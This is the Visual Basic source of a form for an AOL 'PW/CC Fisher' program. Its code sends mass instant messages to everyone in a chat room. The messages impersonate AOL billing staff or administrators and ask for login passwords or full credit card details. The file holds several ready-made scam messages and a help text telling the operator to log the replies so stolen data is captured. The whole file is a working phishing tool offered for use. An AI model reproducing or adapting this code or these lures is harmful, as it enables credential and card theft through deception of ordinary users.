  VERSION 2.00
  Begin Form phish
    BackColor       =   &H8000000F&
    BorderStyle     =   3   'Fixed Double
    Caption         =   "Fisher"
    ClientHeight    =   4965
    ClientLeft      =   4395
    ClientTop       =   345
    ClientWidth     =   5160
    Height          =   5370
    Icon            =   PHISH.FRX:0000
    Left            =   4335
    LinkTopic       =   "Form4"
    MaxButton       =   0   'False
    ScaleHeight     =   4965
    ScaleWidth      =   5160
    Top             =   0
    Width           =   5280
    Begin SSCommand Command3D3
      BevelWidth      =   3
      Caption         =   "&Help!"
      Font3D          =   3 'Inset w/light shading
      FontBold        =   -1    'True
      FontItalic      =   0 'False
      FontName        =   "Times New Roman"
      FontSize        =   9.75
      FontStrikethru  =   0 'False
      FontUnderline   =   0 'False
      ForeColor       =   &H00000000&
      Height          =   375
      HelpContextID   =   16
      Left            =   2160
      TabIndex        =   10
      Top             =   4440
      Width           =   975
    End
    Begin VBMsg VBMsg3
      Height          =   420
      Left            =   4680
      MessageCount    =   PHISH.FRX:0302
      MessageList     =   PHISH.FRX:0304
      MessageTypes    =   0 'Selected Messages
      PostDefault     =   0 'False
      Top             =   1440
      Width           =   420
    End
    Begin Timer Timer1
      Enabled         =   0 'False
      Interval        =   200
      Left            =   1920
      Top             =   2520
    End
    Begin VBMsg VBMsg2
      Height          =   420
      Left            =   3960
      MessageCount    =   PHISH.FRX:0502
      MessageList     =   PHISH.FRX:0504
      MessageTypes    =   0 'Selected Messages
      PostDefault     =   0 'False
      Top             =   2640
      Width           =   420
    End
    Begin VBMsg VBMsg1
      Height          =   420
      Left            =   4800
      MessageCount    =   PHISH.FRX:0702
      MessageList     =   PHISH.FRX:0704
      MessageTypes    =   0 'Selected Messages
      PostDefault     =   0 'False
      Top             =   4440
      Width           =   420
    End
    Begin TextBox Text2
      Height          =   285
      Left            =   3480
      TabIndex        =   14
      Text            =   "20"
      Top             =   1440
      Width           =   375
    End
    Begin SSCommand Command3D2
      BevelWidth      =   3
      Caption         =   "&Cancel"
      Font3D          =   3 'Inset w/light shading
      FontBold        =   -1    'True
      FontItalic      =   0 'False
      FontName        =   "Times New Roman"
      FontSize        =   12
      FontStrikethru  =   0 'False
      FontUnderline   =   0 'False
      Height          =   375
      Left            =   3480
      TabIndex        =   12
      Top             =   4440
      Width           =   975
    End
    Begin SSCommand Command3D1
      BevelWidth      =   3
      Caption         =   "&Start"
      Font3D          =   3 'Inset w/light shading
      FontBold        =   -1    'True
      FontItalic      =   0 'False
      FontName        =   "Times New Roman"
      FontSize        =   12
      FontStrikethru  =   0 'False
      FontUnderline   =   0 'False
      Height          =   375
      Left            =   720
      TabIndex        =   11
      Top             =   4440
      Width           =   1095
    End
    Begin SSOption Option3D6
      Caption         =   "Fish For &Credit Cards"
      FontBold        =   -1    'True
      FontItalic      =   0 'False
      FontName        =   "Times New Roman"
      FontSize        =   9.75
      FontStrikethru  =   0 'False
      FontUnderline   =   0 'False
      Height          =   255
      Left            =   240
      TabIndex        =   9
      TabStop         =   0 'False
      Top             =   1440
      Width           =   2055
    End
    Begin SSOption Option3D5
      Caption         =   "Fish For &Passwords"
      FontBold        =   -1    'True
      FontItalic      =   0 'False
      FontName        =   "Times New Roman"
      FontSize        =   9.75
      FontStrikethru  =   0 'False
      FontUnderline   =   0 'False
      Height          =   255
      Left            =   240
      TabIndex        =   8
      Top             =   1080
      Value           =   -1    'True
      Width           =   1935
    End
    Begin SSFrame Frame3D1
      Caption         =   "What You Will Say"
      FontBold        =   -1    'True
      FontItalic      =   0 'False
      FontName        =   "Times New Roman"
      FontSize        =   9.75
      FontStrikethru  =   0 'False
      FontUnderline   =   0 'False
      Height          =   735
      Left            =   120
      TabIndex        =   2
      Top             =   1800
      Width           =   4815
      Begin SSOption Option3D4
        Caption         =   "&Custom"
        Height          =   255
        Left            =   3840
        TabIndex        =   6
        TabStop         =   0   'False
        Top             =   360
        Width           =   855
      End
      Begin SSOption Option3D3
        Caption         =   "Phrase &3"
        Height          =   255
        Left            =   2640
        TabIndex        =   5
        TabStop         =   0   'False
        Top             =   360
        Width           =   1215
      End
      Begin SSOption Option3D2
        Caption         =   "Phrase &2"
        Height          =   255
        Left            =   1440
        TabIndex        =   4
        TabStop         =   0   'False
        Top             =   360
        Width           =   1215
      End
      Begin SSOption Option3D1
        Caption         =   "Phrase &1"
        Height          =   255
        Left            =   240
        TabIndex        =   3
        Top             =   360
        Value           =   -1  'True
        Width           =   1215
      End
    End
    Begin TextBox Text1
      FontBold        =   -1    'True
      FontItalic      =   0 'False
      FontName        =   "Times New Roman"
      FontSize        =   8.25
      FontStrikethru  =   0 'False
      FontUnderline   =   0 'False
      Height          =   1215
      Left            =   240
      MultiLine       =   -1    'True
      ScrollBars      =   2 'Vertical
      TabIndex        =   1
      Top             =   3000
      Width           =   4695
    End
    Begin Label Label4
      AutoSize        =   -1    'True
      BackColor       =   &H8000000F&
      Caption         =   "Number of people in room:"
      FontBold        =   -1    'True
      FontItalic      =   0 'False
      FontName        =   "Times New Roman"
      FontSize        =   9.75
      FontStrikethru  =   0 'False
      FontUnderline   =   0 'False
      Height          =   225
      Left            =   2640
      TabIndex        =   13
      Top             =   1080
      Width           =   2145
    End
    Begin Label Label2
      BackColor       =   &H8000000F&
      Caption         =   "Text to Be Sent:"
      FontBold        =   -1    'True
      FontItalic      =   0 'False
      FontName        =   "Times New Roman"
      FontSize        =   9.75
      FontStrikethru  =   0 'False
      FontUnderline   =   -1    'True
      Height          =   255
      Left            =   120
      TabIndex        =   7
      Top             =   2640
      Width           =   1335
    End
    Begin Label Label1
      BackColor       =   &H8000000F&
      Caption         =   "PW/CC Fisher"
      FontBold        =   -1    'True
      FontItalic      =   -1    'True
      FontName        =   "Times New Roman"
      FontSize        =   34.5
      FontStrikethru  =   0 'False
      FontUnderline   =   0 'False
      Height          =   855
      Left            =   480
      TabIndex        =   0
      Top             =   120
      Width           =   4335
    End
  End
  Declare Function SetWindowPos Lib "User" (ByVal h%, ByVal hb%, ByVal x%, ByVal y%, ByVal cx%, ByVal cy%, ByVal f%) As Integer


  Const SWP_NOMOVE = 2
  Const SWP_NOSIZE = 1
  Const FLAGS = SWP_NOMOVE Or SWP_NOSIZE
  Const HWND_TOPMOST = -1
  Const HWND_NOTOPMOST = -2

  Sub Command3D1_Click ()
    If SignStatus = 0 Then
      MsgBox "You must be signed on to AOL before you can use this feature!", 16, "Not Signed On!"
      Exit Sub
    End If
    GoTo begin

    titfuck:
    MsgBox "An error has occured.  Cannot continue."
    timer1.Enabled = False
    Exit Sub

    begin:
    timer1.Enabled = True

  'Clipboard.SetText text1.Text
  '''On Error GoTo titfuck
    If Text2.Text = "" Then MsgBox "Please enter the number of people in the room."

    phish.Hide
    punt2stat.Show
    If option3d5.Value = True Then punt2stat.Caption = "Phishing for PWs"
    If option3d6.Value = True Then punt2stat.Caption = "Phishing for CCs"
    punt2stat.Panel3D1.Caption = "Phishing.."
    AppActivate "America  Online"

    thiswin% = FindWindow(0, "America  Online")
    find7% = FindChildByTitle(thiswin%, "People")
    VBMsg1.SubClasshWnd = find7%
    find8% = FindChildByTitle(thiswin%, "Message")
    For y = 1 To Text2.Text

      If quit6 = 1000 Then GoTo endall
      find10% = FindChildByTitle(thiswin%, "Send Instant")
      While find10% > 0
        VBMsg2.SubClasshWnd = find10%
        VBMsg2.SendMessage = WM_CLOSE
        find10% = FindChildByTitle(thiswin%, "Send Instant")
      Wend

      VBMsg2.SubClasshWnd = find8%
      VBMsg2.SendMessage = WM_LBUTTONDOWN
      VBMsg2.SendMessage = WM_LBUTTONUP

      If y = 1 Then Call Pause(4.5) Else Call Pause(1.5)
      DoEvents
      lint = 510    '7500
      lpstring = Text1.Text
      find11% = FindChildByTitle(thiswin%, "Send Instant")
      find9% = VBEnumChildWindows(find11%, 4)
      find12% = VBEnumChildWindows(find11%, 3)
      x = SendMessagebyString(find12%, WM_SETTEXT, lint, lpstring)  ',lint

    ' SendKeys "^V"
      DoEvents
      Call Pause(.2)
      On Error GoTo nana1

      VBMsg2.SubClasshWnd = find9%
      VBMsg2.SendMessage = WM_LBUTTONDOWN
      VBMsg2.SendMessage = WM_LBUTTONUP


      nana1:
      Resume nana2

      nana2:
      On Error GoTo titfuck

    'SendKeys "{TAB} "
      DoEvents
      Call Pause(2)
      VBMsg1.SendMessage = WM_CHILDACTIVATE
      DoEvents
      Call Pause(.1)

      SendKeys "{TAB 2}"
      SendKeys "{DOWN}"
      DoEvents
      Call Pause(.1)


    Next y

    endall:
    Unload punt2stat
    quit6 = 0
    phish.Show
    timer1.Enabled = False

  End Sub

  Sub Command3D2_Click ()
    Unload Me
    main.Show

  End Sub

  Sub Command3D3_Click ()
    SendKeys "{F1}"
    DoEvents


  End Sub

  Sub Command3D4_Click ()
    MsgBox "Don't forget to turn on session logging, and click on ""Log Instant Messages"" too, so you won't miss anything.  Do this now before you hit the ""Start"" button.  On AOL, under the FILE menu, choose ""Logging"" then under Session Log, click the OPEN button.  Choose a name for the file you want all the info to be sent to, and click OK.  Next, click on ""Log Instant Messages""  After you're done fishing, goto File|Open and double-click on that log file.  You'll find everything in there (don't have to write anything down!).  Then you're ready." + Chr(13) + " " + Chr(13) + "Don't forget, you must open the people list to the room you want to fish.  If you don't do this, it won't work."

  End Sub

  Sub Form_Load ()
    Dim Success As Integer

    Success% = SetWindowPos%(phish.hWnd, HWND_TOPMOST, 0, 0, 0, 0, FLAGS)
    main.Hide

    If option3d5.Value = True Then Text1.Text = "Good evening, I am with the America Online billing department.  We are sorry to inform you that we are experiencing difficulties with our records and we have lost your account information.  I need you to verify your log-on password to me so that I can validate you as a user, and fix our records promptly.  Thank you for your cooperation and continue to enjoy America Online!"
    If option3d6.Value = True Then Text1.Text = "Hello, this is the America Online Billing Department.  I am sorry to inform you that we are having problems locating your billing information.  We need you to hit the Respond button, and reply with your Full name, Address, Credit card number with Expiration date, and your telephone number.  We apologize for this inconvenience.  Thank you for your cooperation."


  End Sub

  Sub Form_Unload (Cancel As Integer)
    main.Show

  End Sub

  Sub Option3D1_Click (Value As Integer)
    If option3d5.Value = True Then Text1.Text = "Good evening, I am with the America Online billing department.  We are sorry to inform you that we are experiencing difficulties with our records and we have lost your account information.  I need you to verify your log-on password to me so that I can validate you as a user, and fix our records promptly.  Thank you for your cooperation and continue to enjoy America Online!"
    If option3d6.Value = True Then Text1.Text = "Hello, this is the America Online Billing Department.  I am sorry to inform you that we are having problems locating your billing information.  We need you to hit the Respond button, and reply with your Full name, Address, Credit card number with Expiration date, and your telephone number.  We apologize for this inconvenience.  Thank you for your cooperation."

  End Sub

  Sub Option3D2_Click (Value As Integer)
    If option3d5.Value = True Then Text1.Text = "Hello, I am an America Online Administrator.  Due to a problem we're experiencing with the Sprint Network, we need you to verify your log-in password to me so that you can continue this log-in session with America Online.  We apologize for this inconvenience, and thank you for cooperation."
    If option3d6.Value = True Then Text1.Text = "ATTENTION:  This is the America Online billing department.  Due to an error that occured in your Membership Enrollment process we did not receieve your billing information.  We need you to reply back with your Full name, Credit card number with Expiration date, and your telephone number.  We are very sorry for this inconvenience and hope that you continue to enjoy America Online in the future."

  End Sub

  Sub Option3D3_Click (Value As Integer)
    If option3d6.Value = True Then
      Text1.Text = ""
      ret = Chr$(13) + Chr$(10)
      Text1.Text = ret + "ATTENTION: AOL NEWS" + ret + "******************************" + ret + "Hi, I'm with the America Online billing department.  We are having trouble verifying your account information that you have given us.  We would like to correct this problem as soon as possible to avoid unneeded cancellation of your account.  Please state your billing information in the following format: Full name, credit number with expiration date, address, and telephone number.  Thank you for your cooperation."
    End If
    If option3d5.Value = True Then
      Text1.Text = ""
      ret = Chr$(13) + Chr$(10)
      Text1.Text = ret + "ATTENTION: AOL NEWS" + ret + "******************************" + ret + "Hi, I'm with the America Online billing department.  Due to a problem we our experiencing with our records, we have lost vital information concerning your account.  We need you to hit the Respond button and reply back with your current password so we may verify this information and correct the problem as soon as possible to avoid unneeded cancellation of your account.  Thank you for your cooperation."
    End If


  End Sub

  Sub Option3D4_Click (Value As Integer)
    Text1.Text = "Enter what you want to say here."

  End Sub

  Sub Option3D5_Click (Value As Integer)
    If option3d1.Value = True Then Text1.Text = "Good evening, I am with the America Online billing department.  We are sorry to inform you that we are experiencing difficulties with our records and we have lost your account information.  I need you to verify your log-on password to me so that I can validate you as a user, and fix our records promptly.  Thank you for your cooperation and continue to enjoy America Online!"
    If option3d2.Value = True Then Text1.Text = "Hello, I am an America Online Administrator.  Due to a problem we're experiencing with the Sprint Network, we need you to verify your log-in password to me so that you can continue this log-in session with America Online.  We apologize for this inconvenience, and thank you for cooperation."
    If option3d3.Value = True Then
      If option3d6.Value = True Then
        Text1.Text = ""
        ret = Chr$(13) + Chr$(10)
        Text1.Text = ret + "ATTENTION: AOL NEWS" + ret + "******************************" + ret + "Hi, I'm with the America Online billing department.  Due to a problem we our experiencing with our records, we have lost vital information concerning your account.  We need you to hit the Respond button and reply back with your current password so we may verify this information and correct the problem as soon as possible to avoid unneeded cancellation of your account.  Thank you for your cooperation."
      End If

    End If
    If option3d4.Value = True Then Text1.Text = "Enter what you want to say here."


  End Sub

  Sub Option3D6_Click (Value As Integer)
    If option3d1.Value = True Then Text1.Text = "Hello, this is the America Online Billing Department.  I am sorry to inform you that we are having problems locating your billing information.  We need you to hit the Respond button, and reply with your Full name, Address, Credit card number with Expiration date, and your telephone number.  We apologize for this inconvenience.  Thank you for your cooperation."
    If option3d2.Value = True Then Text1.Text = "ATTENTION:  This is the America Online billing department.  Due to an error that occured in your Membership Enrollment process we did not receieve your billing information.  We need you to reply back with your Full name, Credit card number with Expiration date, and your telephone number.  We are very sorry for this inconvenience and hope that you continue to enjoy America Online in the future."
    If option3d3.Value = True Then
      Text1.Text = ""
      ret = Chr$(13) + Chr$(10)
      Text1.Text = ret + "ATTENTION: AOL NEWS" + ret + "******************************" + ret + "Hi, I'm with the America Online billing department.  We are having trouble verifying your account information that you have given us.  We would like to correct this problem as soon as possible to avoid unneeded cancellation of your account.  Please state your billing information in the following format: Full name, credit number with expiration date, address, and telephone number.  Thank you for your cooperation."
    End If
    If option3d4.Value = True Then Text1.Text = "Enter what you want to say here."

  End Sub

  Sub Timer1_Timer ()
    thiswin% = FindWindow(0, "America  Online")
    find13% = FindChildByTitle(thiswin%, ">Instant")
    While find13% > 0
      VBMsg3.SubClasshWnd = find13%
      VBMsg3.SendMessage = WM_CLOSE
      find13% = FindChildByTitle(thiswin%, ">Instant")
    Wend

  End Sub

